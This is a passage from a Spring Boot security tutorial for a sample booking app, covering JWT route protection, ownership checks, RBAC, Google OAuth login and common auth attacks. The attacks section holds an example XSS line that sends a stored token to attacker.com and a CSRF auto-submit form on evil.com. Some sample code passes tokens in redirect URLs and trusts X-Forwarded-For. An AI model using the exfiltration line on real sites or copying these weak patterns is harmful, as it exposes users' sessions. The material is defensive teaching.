                .requestMatchers("/refunds/**").authenticated()
                .requestMatchers("/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            )
            .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class);

        return http.build();
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder(12);
    }

    @Bean
    public AuthenticationManager authenticationManager(
            AuthenticationConfiguration config) throws Exception {
        return config.getAuthenticationManager();
    }
}
```

### Step 4 — Redis Blocklist Service

Used by the filter to check if a token was logged out.

```java
@Service
@RequiredArgsConstructor
public class TokenBlocklistService {

    private final StringRedisTemplate redis;
    private static final String PREFIX = "blocklist:jti:";

    public void block(String jti, long ttlMillis) {
        redis.opsForValue().set(
            PREFIX + jti,
            "1",
            Duration.ofMillis(ttlMillis)
        );
    }

    public boolean isBlocked(String jti) {
        return Boolean.TRUE.equals(redis.hasKey(PREFIX + jti));
    }
}
```

### Step 5 — Accessing the Authenticated User in Controllers

Once the filter sets the `SecurityContext`, controllers can access the current user cleanly:

```java
@RestController
@RequestMapping("/bookings")
@RequiredArgsConstructor
public class BookingController {

    private final BookingService bookingService;

    @PostMapping
    public ResponseEntity<BookingResponse> createBooking(
            @RequestBody  BookingRequest request,
            @AuthenticationPrincipal UserDetails userDetails
    ) {
        Long userId = Long.parseLong(userDetails.getUsername());
        return ResponseEntity.ok(bookingService.create(userId, request));
    }

    @GetMapping("/my")
    public ResponseEntity<List<BookingResponse>> getMyBookings(
            @AuthenticationPrincipal UserDetails userDetails
    ) {
        Long userId = Long.parseLong(userDetails.getUsername());
        return ResponseEntity.ok(bookingService.findByUser(userId));
    }
}
```

### What Happens on Each Request

```
POST /bookings  (no token)
  → JwtAuthFilter: no token found, passes through
  → SecurityConfig: /bookings requires authenticated()
  → 401 Unauthorized  ✓

POST /bookings  (valid token)
  → JwtAuthFilter: verifies token, sets SecurityContext
  → SecurityConfig: authenticated ✓
  → Controller: @AuthenticationPrincipal available  ✓

POST /admin/hotels  (guest token)
  → JwtAuthFilter: verifies token, sets SecurityContext (role=GUEST)
  → SecurityConfig: /admin/** requires ADMIN role
  → 403 Forbidden  ✓

POST /admin/hotels  (admin token)
  → JwtAuthFilter: verifies token, sets SecurityContext (role=ADMIN)
  → SecurityConfig: role matches  ✓
  → Controller proceeds  ✓
```

#### Summary

* `JwtAuthFilter` — extracts and verifies token on every request, populates SecurityContext
* `SecurityConfig` — declares which routes are public, authenticated, or role-restricted
* `TokenBlocklistService` — Redis-backed, checks if a jti was revoked on logout
* `@AuthenticationPrincipal` — clean way to access the current user in any controller
* `SessionCreationPolicy.STATELESS` — tells Spring not to create sessions, JWT only

---

## Layer 3, Topic 8 — Resource Ownership

### The Problem Route Protection Doesn't Solve

Topic 7 answered: "*Is this user logged in?*"
But that's not enough. Consider:

```
Mario  logs in → token { userId: 42 }
Luigi  logs in → token { userId: 99 }

Mario sends:  DELETE /bookings/77   ← Luigi's booking
Server check: is user authenticated?  ✓
Server:       deletes Luigi's booking  ✗
```

Route protection only checks *authentication*. It doesn't check ownership. Mario is authenticated — but booking 77 isn't his.
This class of bug is called **Broken Object Level Authorization (BOLA)** — or IDOR (Insecure Direct Object Reference). It's consistently ranked the #1 API security vulnerability.

#### The Core Rule

> Every time a user accesses a specific resource, verify they own it or are authorized for it — not just that they're logged in.


### Approach 1 — Check in Service Layer

The most straightforward pattern. The service fetches the resource and checks ownership before doing anything.

```java
@Service
@RequiredArgsConstructor
public class BookingService {

    private final BookingRepository bookingRepository;

    public void cancelBooking(Long bookingId, Long requestingUserId) {

        Booking booking = bookingRepository.findById(bookingId)
            .orElseThrow(() -> new ResourceNotFoundException("Booking not found"));

        if (!booking.getUserId().equals(requestingUserId)) {
            throw new AccessDeniedException("You do not own this booking");
        }

        booking.setStatus(BookingStatus.CANCELLED);
        bookingRepository.save(booking);
    }
}
```
Controller stays clean — it just passes the authenticated userId down:
```java
@DeleteMapping("/{bookingId}")
public ResponseEntity<Void> cancelBooking(
        @PathVariable Long bookingId,
        @AuthenticationPrincipal UserDetails userDetails
) {
    Long userId = Long.parseLong(userDetails.getUsername());
    bookingService.cancelBooking(bookingId, userId);
    return ResponseEntity.noContent().build();
}
```

### Approach 2 — Fetch by ID + Owner Together

Instead of fetching then checking, query with both conditions at once. If nothing is returned, either the resource doesn't exist or the user doesn't own it — either way, denied.

```java
// Repository
public interface BookingRepository extends JpaRepository<Booking, Long> {
    Optional<Booking> findByIdAndUserId(Long id, Long userId);
}
```
```java
// Service
public void cancelBooking(Long bookingId, Long requestingUserId) {
    Booking booking = bookingRepository
        .findByIdAndUserId(bookingId, requestingUserId)
        .orElseThrow(() -> new AccessDeniedException("Booking not found or access denied"));

    booking.setStatus(BookingStatus.CANCELLED);
    bookingRepository.save(booking);
}
```

This is cleaner and slightly safer — you never even load a resource the user doesn't own. It also avoids leaking whether a resource exists to unauthorized users.

### Approach 3 — @PreAuthorize with SpEL

Spring Security lets you express ownership rules declaratively using annotations. Useful for simple cases.

```java
@Service
@RequiredArgsConstructor
public class BookingService {

    private final BookingRepository bookingRepository;

    @PreAuthorize("@bookingAuthz.isOwner(#bookingId, authentication)")
    public void cancelBooking(Long bookingId) {
        Booking booking = bookingRepository.findById(bookingId)
            .orElseThrow(() -> new ResourceNotFoundException("Booking not found"));
        booking.setStatus(BookingStatus.CANCELLED);
        bookingRepository.save(booking);
    }
}
```
The `@bookingAuthz` bean handles the ownership check:

```java
@Component("bookingAuthz")
@RequiredArgsConstructor
public class BookingAuthorizationService {

    private final BookingRepository bookingRepository;

    public boolean isOwner(Long bookingId, Authentication authentication) {
        Long userId = Long.parseLong(authentication.getName());
        return bookingRepository.findById(bookingId)
            .map(booking -> booking.getUserId().equals(userId))
            .orElse(false);
    }
}
```
Enable `@PreAuthorize` in your security config:

```java
@Configuration
@EnableMethodSecurity   // ← enables @PreAuthorize
public class SecurityConfig { ... }
```

### Admin Override Pattern

Admins should be able to access any resource. Build this into your ownership check:

```java
// Inline check
public void cancelBooking(Long bookingId, Long requestingUserId, String role) {
    Booking booking = bookingRepository.findById(bookingId)
        .orElseThrow(() -> new ResourceNotFoundException("Booking not found"));

    boolean isAdmin = role.equals("ADMIN");
    boolean isOwner = booking.getUserId().equals(requestingUserId);

    if (!isAdmin && !isOwner) {
        throw new AccessDeniedException("You do not own this booking");
    }

    booking.setStatus(BookingStatus.CANCELLED);
    bookingRepository.save(booking);
}
```
Or with `@PreAuthorize`:
```java
// Or with @PreAuthorize
@PreAuthorize("hasRole('ADMIN') or @bookingAuthz.isOwner(#bookingId, authentication)")
public void cancelBooking(Long bookingId) { ... }
```

#### Ownership Across miniAgoda Resources

Every resource in your system needs its own ownership rule:

```
Booking
  owner:   booking.userId == currentUserId
  admin:   always allowed

Payment
  owner:   payment.userId == currentUserId
            OR payment.bookingId belongs to currentUserId
  admin:   always allowed

Refund
  owner:   refund.userId == currentUserId
  admin:   always allowed

Hotel (if hotel managers exist)
  owner:   hotel.managerId == currentUserId
  admin:   always allowed
```

### The Error Response — Don't Leak Information

There's a subtle security decision in how you respond to ownership failures:

```java
// ❌ Leaks that the resource exists but user doesn't own it
throw new AccessDeniedException("You do not own this booking");   // 403

// ✓ Reveals nothing
throw new AccessDeniedException("Booking not found or access denied");  // 404
```

Returning `403` for an existing resource confirms to an attacker that the resource exists. Returning `404` always reveals nothing. For sensitive resources (payments, personal bookings) — prefer `404`.

### Custom Exception Handler

Wire your exceptions to clean HTTP responses:

```java
@RestControllerAdvice
public class GlobalExceptionHandler {

    @ExceptionHandler(AccessDeniedException.class)
    public ResponseEntity<ErrorResponse> handleAccessDenied(AccessDeniedException ex) {
        return ResponseEntity
            .status(HttpStatus.NOT_FOUND)
            .body(new ErrorResponse("Resource not found or access denied"));
    }

    @ExceptionHandler(ResourceNotFoundException.class)
    public ResponseEntity<ErrorResponse> handleNotFound(ResourceNotFoundException ex) {
        return ResponseEntity
            .status(HttpStatus.NOT_FOUND)
            .body(new ErrorResponse(ex.getMessage()));
    }
}
```

#### Summary

* Route protection checks *authentication* — ownership checks *authorization on a specific resource*
* Fetch by `id + userId` together — cleaner and doesn't load unauthorized resources
* `@PreAuthorize` with a custom bean keeps business logic and auth logic separated
* Admins bypass ownership — build that into every ownership check explicitly
* Return `404` not `403` for ownership failures on sensitive resources — don't confirm existence

---

## Layer 3, Topic 9 — Roles & Permissions

#### What Roles Solve
Ownership (Topic 8) answers: "*does this user own this resource?*"
Roles answer: "*what is this user allowed to do in the system — regardless of ownership?*"

```
Guest          → can search, book, pay, cancel own bookings
Hotel Manager  → can manage their own hotel's inventory, view their bookings
Admin          → can do everything
```

Without roles, your only options are "logged in" or "not logged in". With roles, you get fine-grained control over the entire system.

### RBAC — Role Based Access Control

The most common model. Every user has a role. Every role has a set of permissions.

```
User ──→ Role ──→ Permissions
mario    GUEST    [BOOKING_CREATE, BOOKING_CANCEL_OWN, PAYMENT_CREATE]
kenji    MANAGER  [HOTEL_MANAGE_OWN, BOOKING_VIEW_OWN_HOTEL]
sarah    ADMIN    [*]
```

### Step 1 — Define Roles and Permissions

```java
// Roles
public enum Role {
    GUEST,
    MANAGER,
    ADMIN
}

// Permissions — granular actions in the system
public enum Permission {
    // Booking
    BOOKING_CREATE,
    BOOKING_VIEW_OWN,
    BOOKING_CANCEL_OWN,
    BOOKING_VIEW_ALL,       // admin
    BOOKING_CANCEL_ANY,     // admin

    // Hotel
    HOTEL_VIEW,
    HOTEL_MANAGE_OWN,       // manager
    HOTEL_MANAGE_ANY,       // admin

    // Payment
    PAYMENT_CREATE,
    PAYMENT_VIEW_OWN,
    PAYMENT_REFUND_OWN,
    PAYMENT_REFUND_ANY,     // admin

    // User management
    USER_VIEW_ANY,          // admin
    USER_SUSPEND            // admin
}
```

### Step 2 — Map Roles to Permissions

```java
public enum Role {
    GUEST(Set.of(
        Permission.BOOKING_CREATE,
        Permission.BOOKING_VIEW_OWN,
        Permission.BOOKING_CANCEL_OWN,
        Permission.HOTEL_VIEW,
        Permission.PAYMENT_CREATE,
        Permission.PAYMENT_VIEW_OWN,
        Permission.PAYMENT_REFUND_OWN
    )),

    MANAGER(Set.of(
        Permission.HOTEL_VIEW,
        Permission.HOTEL_MANAGE_OWN,
        Permission.BOOKING_VIEW_OWN,    // own hotel's bookings
        Permission.PAYMENT_VIEW_OWN
    )),

    ADMIN(Set.of(
        Permission.BOOKING_CREATE,
        Permission.BOOKING_VIEW_OWN,
        Permission.BOOKING_VIEW_ALL,
        Permission.BOOKING_CANCEL_OWN,
        Permission.BOOKING_CANCEL_ANY,
        Permission.HOTEL_VIEW,
        Permission.HOTEL_MANAGE_OWN,
        Permission.HOTEL_MANAGE_ANY,
        Permission.PAYMENT_CREATE,
        Permission.PAYMENT_VIEW_OWN,
        Permission.PAYMENT_REFUND_OWN,
        Permission.PAYMENT_REFUND_ANY,
        Permission.USER_VIEW_ANY,
        Permission.USER_SUSPEND
    ));

    private final Set<Permission> permissions;

    Role(Set<Permission> permissions) {
        this.permissions = permissions;
    }

    public Set<Permission> getPermissions() {
        return permissions;
    }

    // Spring Security expects GrantedAuthority objects
    public List<SimpleGrantedAuthority> getAuthorities() {
        List<SimpleGrantedAuthority> authorities = new ArrayList<>();

        // Add each permission as an authority
        permissions.stream()
            .map(p -> new SimpleGrantedAuthority(p.name()))
            .forEach(authorities::add);

        // Add the role itself (Spring convention: prefix with ROLE_)
        authorities.add(new SimpleGrantedAuthority("ROLE_" + this.name()));

        return authorities;
    }
}
```

### Step 3 — Load Authorities into SecurityContext

When the JWT filter loads the user, Spring needs to know their authorities:

```java
@Service
@RequiredArgsConstructor
public class UserDetailsServiceImpl implements UserDetailsService {

    private final UserRepository userRepository;

    @Override
    public UserDetails loadUserByUsername(String userId) {
        User user = userRepository.findById(Long.parseLong(userId))
            .orElseThrow(() -> new UsernameNotFoundException("User not found"));

        return org.springframework.security.core.userdetails.User.builder()
            .username(String.valueOf(user.getId()))
            .password(user.getPasswordHash())
            .authorities(user.getRole().getAuthorities())
            .build();
    }
}
```

### Step 4 — Protect Endpoints by Permission

**By role** — broad access control:

```java
.authorizeHttpRequests(auth -> auth
    .requestMatchers("/admin/**").hasRole("ADMIN")
    .requestMatchers("/manager/**").hasAnyRole("MANAGER", "ADMIN")
    .requestMatchers("/bookings/**").authenticated()
    .anyRequest().authenticated()
)
```

**By permission** — fine-grained access control:

```java
@RestController
@RequestMapping("/bookings")
public class BookingController {

    // Any authenticated user with BOOKING_CREATE permission
    @PostMapping
    @PreAuthorize("hasAuthority('BOOKING_CREATE')")
    public ResponseEntity<BookingResponse> createBooking(...) { ... }

    // Admin only — view any booking
    @GetMapping("/{id}")
    @PreAuthorize("hasAuthority('BOOKING_VIEW_ALL') or " +
                  "@bookingAuthz.isOwner(#id, authentication)")
    public ResponseEntity<BookingResponse> getBooking(@PathVariable Long id, ...) { ... }

    // Admin can cancel any, guest can only cancel own
    @DeleteMapping("/{id}")
    @PreAuthorize("hasAuthority('BOOKING_CANCEL_ANY') or " +
                  "(hasAuthority('BOOKING_CANCEL_OWN') and " +
                  "@bookingAuthz.isOwner(#id, authentication))")
    public ResponseEntity<Void> cancelBooking(@PathVariable Long id, ...) { ... }
}
```

### Step 5 — DB Schema for Roles

```sql
-- Single role per user (simple RBAC)
ALTER TABLE users ADD COLUMN role VARCHAR(50) DEFAULT 'GUEST';

-- For hotel managers — link manager to their hotel
CREATE TABLE hotel_managers (
    user_id   BIGINT REFERENCES users(id),
    hotel_id  BIGINT REFERENCES hotels(id),
    PRIMARY KEY (user_id, hotel_id)
);
```

Manager ownership check uses this join:

```java
@Component("hotelAuthz")
@RequiredArgsConstructor
public class HotelAuthorizationService {

    private final HotelManagerRepository hotelManagerRepository;

    public boolean isManagerOf(Long hotelId, Authentication authentication) {
        Long userId = Long.parseLong(authentication.getName());
        return hotelManagerRepository.existsByUserIdAndHotelId(userId, hotelId);
    }
}
```

```java
@PutMapping("/{hotelId}/inventory")
@PreAuthorize("hasAuthority('HOTEL_MANAGE_ANY') or " +
              "(hasAuthority('HOTEL_MANAGE_OWN') and " +
              "@hotelAuthz.isManagerOf(#hotelId, authentication))")
public ResponseEntity<Void> updateInventory(@PathVariable Long hotelId, ...) { ... }
```

#### Role in the JWT

Include role in the token so middleware doesn't need a DB lookup for basic checks:

```java
public String generateAccessToken(User user) {
    return Jwts.builder()
        .subject(String.valueOf(user.getId()))
        .claim("email", user.getEmail())
        .claim("role",  user.getRole().name())   // "GUEST", "MANAGER", "ADMIN"
        .claim("jti",   UUID.randomUUID().toString())
        .issuedAt(new Date())
        .expiration(new Date(System.currentTimeMillis() + accessTokenExpiry))
        .signWith(getSigningKey())
        .compact();
}
```

One important implication — if a user's role is changed (guest promoted to manager), their existing token still carries the old role until it expires. This is why short-lived access tokens matter. For immediate role updates, you'd need to add the user's role version to the token and check it against the DB — or simply use the blocklist to invalidate their current token.

#### The Full Permission Check Flow

```
DELETE /bookings/77

JwtAuthFilter:
  → verifies token
  → loads user: { userId: 42, role: GUEST }
  → sets authorities: [BOOKING_CREATE, BOOKING_CANCEL_OWN, ..., ROLE_GUEST]

@PreAuthorize check:
  → hasAuthority('BOOKING_CANCEL_ANY')?   GUEST doesn't have it  ✗
  → hasAuthority('BOOKING_CANCEL_OWN')?   GUEST has it           ✓
  → @bookingAuthz.isOwner(77, auth)?      booking 77 userId=42   ✓
  → combined: true  ✓

BookingService.cancelBooking(77):
  → proceeds
```

#### Summary

* Roles group users by what they're allowed to do — GUEST, MANAGER, ADMIN
* Permissions are granular actions — `BOOKING_CANCEL_OWN`, `HOTEL_MANAGE_ANY`
* Roles map to sets of permissions — Spring loads both as `GrantedAuthority`
* `@PreAuthorize` combines role checks and ownership checks in one expression
* Role is stored in JWT for fast access — but short expiry handles stale role data
* Manager-to-hotel relationship lives in a join table, checked via a custom authz bean

That completes Layer 3 — **Authorization**. You now understand:

* ✅ Protecting routes with middleware (JwtAuthFilter + SecurityConfig)
* ✅ Resource ownership (BOLA prevention, fetch by id+owner)
* ✅ Roles & permissions (RBAC, @PreAuthorize, authorities)

---

## Layer 4, Topic 10 — OAuth / Social Login

### What OAuth Actually Is

A common misconception — OAuth is not an authentication protocol. It's an **authorization** protocol. It answers:

> "Can this third-party app access my Google data on my behalf?"

But the industry hijacked it for "Login with Google" — which is why **OpenID Connect (OIDC)** was built on top of OAuth 2.0 to add the actual identity layer.

In practice when you implement "Login with Google":

* **OAuth 2.0** handles the authorization flow — getting access to Google's APIs
* **OpenID Connect** adds the identity layer — who the user actually is

You use both together. Most people just call the whole thing "OAuth".

#### The Core Problem It Solves

Without OAuth, "Login with Google" would mean:

```
User gives miniAgoda their Google email + password
miniAgoda logs into Google on their behalf
```

This is catastrophic — miniAgoda sees the Google password, and if miniAgoda is breached, Google credentials leak.
OAuth solves this by never sharing the password. miniAgoda never sees it.

### The Flow — Step by Step

```
User clicks "Login with Google"
        │
        ▼
miniAgoda redirects user to Google's auth server
  with:  client_id, redirect_uri, scope, state
        │
        ▼
Google shows consent screen → User clicks Allow
        │
        ▼
Google redirects back to miniAgoda with: authorization_code
        │
        ▼
miniAgoda backend exchanges code for tokens
  sends: code + client_secret → Google
  gets:  access_token + id_token
        │
        ▼
miniAgoda validates id_token (JWT from Google)
  extracts: { email, name, googleId, picture }
        │
        ▼
miniAgoda finds or creates user in its own DB
issues its own JWT to the user
```

The user's Google password never touches miniAgoda. Google handles the authentication. miniAgoda just receives a verified identity.

#### Key Parameters Explained

**Client ID + Client Secret** When you register miniAgoda with Google Cloud Console, Google gives you these. Client ID is public — sent in URLs. Client Secret is private — never exposed to the browser, only used server-to-server.

**Redirect URI** Where Google sends the user back after they approve. Must be pre-registered with Google. Prevents attackers from redirecting the auth code to their own server.

**Scope** What data miniAgoda is requesting access to:

```
openid         → identity (required for OIDC)
email          → user's email address
profile        → name, picture
```

**State** A random value miniAgoda generates and sends to Google. Google sends it back. miniAgoda verifies it matches. Prevents CSRF attacks on the OAuth flow.

**Authorization Code** Short-lived, single-use code Google sends back. Meaningless on its own — must be exchanged for tokens server-side. Even if intercepted in the URL, useless without the client secret.

**ID Token** A JWT from Google containing the user's identity. miniAgoda verifies its signature using Google's public keys.

### Spring Boot Implementation

#### Step 1 — Dependencies

```xml
<!-- pom.xml -->
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-oauth2-client</artifactId>
</dependency>
```

#### Step 2 — Configuration

```yaml
# application.yml
spring:
  security:
    oauth2:
      client:
        registration:
          google:
            client-id:      ${GOOGLE_CLIENT_ID}
            client-secret:  ${GOOGLE_CLIENT_SECRET}
            redirect-uri:   "{baseUrl}/auth/oauth2/callback/google"
            scope:
              - openid
              - email
              - profile
```

### Step 3 — Security Config

```java
@Configuration
@EnableWebSecurity
@RequiredArgsConstructor
public class SecurityConfig {

    private final JwtAuthFilter        jwtAuthFilter;
    private final OAuth2SuccessHandler oAuth2SuccessHandler;
    private final OAuth2FailureHandler oAuth2FailureHandler;

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf.disable())
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
            )
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/auth/**", "/oauth2/**", "/hotels/**").permitAll()
                .anyRequest().authenticated()
            )
            .oauth2Login(oauth2 -> oauth2
                .authorizationEndpoint(endpoint -> endpoint
                    .baseUri("/auth/oauth2/authorize")
                )
                .redirectionEndpoint(endpoint -> endpoint
                    .baseUri("/auth/oauth2/callback/*")
                )
                .userInfoEndpoint(endpoint -> endpoint
                    .oidcUserService(oidcUserService())
                )
                .successHandler(oAuth2SuccessHandler)
                .failureHandler(oAuth2FailureHandler)
            )
            .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class);

        return http.build();
    }

    @Bean
    public OidcUserService oidcUserService() {
        return new OidcUserService();
    }
}
```

#### Step 4 — Success Handler

This is where miniAgoda takes over after Google confirms identity. Find or create the user, issue miniAgoda's own JWT.

```java
@Component
@RequiredArgsConstructor
public class OAuth2SuccessHandler implements AuthenticationSuccessHandler {

    private final UserService userService;
    private final JwtUtil     jwtUtil;

    @Override
    public void onAuthenticationSuccess(
            HttpServletRequest  request,
            HttpServletResponse response,
            Authentication      authentication
    ) throws IOException {

        OidcUser oidcUser = (OidcUser) authentication.getPrincipal();

        String googleId = oidcUser.getSubject();
        String email    = oidcUser.getEmail();
        String name     = oidcUser.getFullName();
        String picture  = oidcUser.getPicture();

        User user = userService.findOrCreateOAuthUser(
            "GOOGLE", googleId, email, name, picture
        );

        String accessToken  = jwtUtil.generateAccessToken(user);
        String refreshToken = userService.createRefreshToken(user);

        String redirectUrl = "https://miniagoda.com/auth/callback?token=" + accessToken;
        response.sendRedirect(redirectUrl);
    }
}
```

### Step 5 — Find or Create User

OAuth users don't have passwords — handle that in your user model:

```java
@Service
@RequiredArgsConstructor
public class UserService {

    private final UserRepository userRepository;

    public User findOrCreateOAuthUser(
            String provider,
            String providerId,
            String email,
            String name,
            String picture
    ) {
        return userRepository
            .findByProviderAndProviderId(provider, providerId)
            .orElseGet(() ->
                userRepository.save(
                    User.builder()
                        .email(email)
                        .name(name)
                        .picture(picture)
                        .provider(provider)
                        .providerId(providerId)
                        .passwordHash(null)
                        .role(Role.GUEST)
                        .build()
                )
            );
    }
}
```

### Updated DB Schema

```sql
ALTER TABLE users ADD COLUMN provider    VARCHAR(50);
ALTER TABLE users ADD COLUMN provider_id VARCHAR(255);
ALTER TABLE users ADD COLUMN name        VARCHAR(255);
ALTER TABLE users ADD COLUMN picture     VARCHAR(500);

ALTER TABLE users ALTER COLUMN password_hash DROP NOT NULL;

CREATE UNIQUE INDEX idx_users_provider ON users(provider, provider_id);
```

### Account Linking — The Edge Case

What if a user previously registered with email/password using `mario@gmail.com`, and now tries "Login with Google" with the same email?

```
Existing:  { email: mario@gmail.com, provider: LOCAL,  passwordHash: "..." }
Incoming:  { email: mario@gmail.com, provider: GOOGLE, googleId: "xyz" }
```

You have three options:

```
Option A — Auto-link
  Same email = same person, merge accounts silently
  Risk: email spoofing — attacker creates Google account with victim's email

Option B — Prompt to link
  "An account with this email exists. Log in with password to link accounts."
  Safer — confirms ownership before linking

Option C — Treat as separate accounts
  Simplest, but confusing UX
```

For miniAgoda, **Option B** is the right balance — prompt to link, verify ownership first.

#### The Flow Summarized

```
miniAgoda never sees Google password         ✓
Google verifies the user's identity          ✓
miniAgoda gets email + name + googleId       ✓
miniAgoda issues its own JWT                 ✓
From here — identical to email/password auth ✓
```

After the OAuth flow, the rest of your system doesn't know or care how the user authenticated. They have a miniAgoda JWT. Everything in Topics 7, 8, 9 applies exactly the same.

#### Summary

* OAuth 2.0 + OIDC — OAuth handles the flow, OIDC adds the identity (id_token)
* miniAgoda never sees Google's password — Google authenticates, miniAgoda gets the result
* `state` parameter prevents CSRF on the OAuth flow
* After Google confirms identity — find or create user, issue miniAgoda's own JWT
* OAuth users have no password — `password_hash` is nullable
* Account linking needs care — auto-linking on email alone is unsafe

---

## Layer 4, Topic 11 — Common Attacks & Defenses

#### Overview

Auth is the front door of your system. It gets attacked more than anything else. This topic covers the attacks most relevant to miniAgoda — what they are, how they work, and exactly how to stop them.

### Attack 1 — Brute Force

**How it works**

Attacker systematically tries passwords against a known email:

```
POST /auth/login { email: "mario@gmail.com", password: "sunshine1"  } → 401
POST /auth/login { email: "mario@gmail.com", password: "sunshine2"  } → 401
POST /auth/login { email: "mario@gmail.com", password: "sunshine99" } → 200 ✓
```

Modern GPUs can try millions of combinations per second. Without rate limiting, a weak password falls in seconds.

**Defense — Rate Limiting per IP + per Email**

```java
@Component
@RequiredArgsConstructor
public class LoginRateLimiter {

    private final StringRedisTemplate redis;

    private static final int  MAX_ATTEMPTS    = 5;
    private static final long WINDOW_SECONDS  = 60;
    private static final long LOCKOUT_SECONDS = 900;

    public void checkAndIncrement(String email, String ip) {

        String emailKey = "ratelimit:email:" + email;
        String ipKey    = "ratelimit:ip:"    + ip;

        long emailAttempts = increment(emailKey, WINDOW_SECONDS);
        long ipAttempts    = increment(ipKey,    WINDOW_SECONDS);

        if (emailAttempts > MAX_ATTEMPTS || ipAttempts > MAX_ATTEMPTS * 3) {
            redis.expire(emailKey, Duration.ofSeconds(LOCKOUT_SECONDS));
            throw new TooManyRequestsException("Too many login attempts. Try again later.");
        }
    }

    private long increment(String key, long ttlSeconds) {
        Long count = redis.opsForValue().increment(key);
        if (count != null && count == 1) {
            redis.expire(key, Duration.ofSeconds(ttlSeconds));
        }
        return count != null ? count : 0;
    }
}
```
Call it at the top of your login service — before any DB lookup:

```java
// In AuthService
public AuthResponse login(LoginRequest request, String ip) {
    rateLimiter.checkAndIncrement(request.getEmail(), ip);
    // ... rest of login logic
}
```
Extract client IP in the controller:

```java
@PostMapping("/login")
public ResponseEntity<AuthResponse> login(
        @RequestBody LoginRequest request,
        HttpServletRequest httpRequest
) {
    String ip = getClientIp(httpRequest);
    return ResponseEntity.ok(authService.login(request, ip));
}

private String getClientIp(HttpServletRequest request) {
    String forwarded = request.getHeader("X-Forwarded-For");
    return (forwarded != null)
        ? forwarded.split(",")[0].trim()
        : request.getRemoteAddr();
}
```

### Attack 2 — Credential Stuffing

**How it works**

Brute force tries random passwords. Credential stuffing is smarter — it uses real leaked credentials from other breached sites.

```
Attacker buys leaked DB:  mario@gmail.com : Sunshine99!
Tries same combo on miniAgoda → works, because Mario reused password
```

Billions of leaked credentials are freely available. This attack is largely automated and hits at scale.

**Defenses**

**Rate limiting** (same as brute force) slows it down.
**Anomaly detection** — flag suspicious patterns:

```
// Flag if: many accounts attempted from same IP
// Flag if: same account attempted from many IPs simultaneously
// Flag if: login from new country for this user
```

**Have I Been Pwned API** — check if submitted password appears in known breaches:

```java
public boolean isPasswordPwned(String password) throws Exception {
    String sha1   = sha1Hash(password).toUpperCase();
    String prefix = sha1.substring(0, 5);
    String suffix = sha1.substring(5);

    String url      = "https://api.pwnedpasswords.com/range/" + prefix;
    String response = httpClient.get(url);

    return response.lines()
        .anyMatch(line -> line.startsWith(suffix));
}
```

Check at registration — reject passwords that appear in known breaches.

### Attack 3 — JWT Tampering

**How it works**

Recall from Topic 3 — the payload is base64 encoded, not encrypted. An attacker decodes it, modifies it, re-encodes it:

```
Original:  { "userId": 42, "role": "GUEST" }
Tampered:  { "userId": 42, "role": "ADMIN" }
```

The signature won't match — that's your protection. But there are two specific JWT attacks that bypass this.

**Sub-attack A — Algorithm Confusion (alg:none)**
Early JWT libraries accepted `"alg": "none"` — meaning no signature required. Attacker sets:

```
{ "alg": "none", "typ": "JWT" }
```

And submits a token with no signature. Vulnerable libraries accepted it.

**Defense**

```java
// Always explicitly specify allowed algorithms — modern JJWT rejects "none" by default
Jwts.parser()
    .verifyWith(getSigningKey())
    .build()
    .parseSignedClaims(token);
```

Never use outdated JWT libraries. JJWT 0.12+ is safe.

**Sub-attack B — RS256 to HS256 Confusion**

If your server uses RS256 (asymmetric), the public key is... public. An attacker can:

```
Take server's public key
Use it as the HMAC secret for HS256
Sign a tampered token with it
Submit as HS256
```

A vulnerable server verifying with its public key would accept this.

**Defense**: Always explicitly verify with the expected algorithm:

```
// In JwtUtil — never trust alg from the token header
Jwts.parser()
    .verifyWith(getSigningKey())      // for HS256
    // or
    .verifyWith(getRsaPublicKey())    // for RS256
    .build()
    .parseSignedClaims(token);
```

Modern libraries handle this, but it's worth understanding why.

### Attack 4 — Token Theft via XSS

**How it works**

Cross-Site Scripting (XSS) — attacker injects malicious JavaScript into your page. If the token is in localStorage, that script reads and exfiltrates it:

```javascript
// Injected malicious script
fetch("https://attacker.com/steal?token=" + localStorage.getItem("accessToken"))
```

Token is now in the attacker's hands. They can impersonate the user from anywhere.

**Defense — HttpOnly Cookies**

A cookie with the `HttpOnly` **flag cannot be read by JavaScript** — not even by injected scripts:

```java
@PostMapping("/login")
public ResponseEntity<Void> login(
        @RequestBody LoginRequest request,
        HttpServletResponse response
) {
    AuthTokens tokens = authService.login(request);

    ResponseCookie accessCookie = ResponseCookie.from("accessToken", tokens.getAccessToken())
        .httpOnly(true)
        .secure(true)
        .sameSite("Strict")
        .maxAge(Duration.ofMinutes(15))
        .path("/")
        .build();

    ResponseCookie refreshCookie = ResponseCookie.from("refreshToken", tokens.getRefreshToken())
        .httpOnly(true)
        .secure(true)
        .sameSite("Strict")
        .maxAge(Duration.ofDays(7))
        .path("/auth/refresh")
        .build();

    response.addHeader(HttpHeaders.SET_COOKIE, accessCookie.toString());
    response.addHeader(HttpHeaders.SET_COOKIE, refreshCookie.toString());

    return ResponseEntity.ok().build();
}
```

XSS can still do damage (make API calls as the user) — but it can't steal the token and use it from elsewhere.

### Attack 5 — CSRF

**How it works**

Cross-Site Request Forgery. If your token is in a cookie, the browser automatically sends it — even on requests triggered by other sites:

```
User is logged into miniAgoda (cookie set)
User visits evil.com
evil.com contains:
  <form action="https://miniagoda.com/bookings/77/cancel" method="POST">
  <script>document.forms[0].submit()</script>

Browser sends the request — with miniAgoda cookie attached automatically
miniAgoda cancels booking 77
```

**Defense A — SameSite Cookie Flag**

```java
.sameSite("Strict")  // cookie only sent on same-site requests
```

`Strict` — cookie never sent on cross-site requests. Stops CSRF entirely for modern browsers.
`Lax` — cookie sent on top-level navigations (clicking a link) but not on cross-site POST. Good balance for most apps.

**Defense B — CSRF Token (for older browser support)**

```java
// Spring Security CSRF token — include in every state-changing request
http.csrf(csrf -> csrf
    .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
    // stores CSRF token in a readable cookie
    // client must read it and send it back as a header
    // attacker's site can't read cookies from miniAgoda's domain
);
```

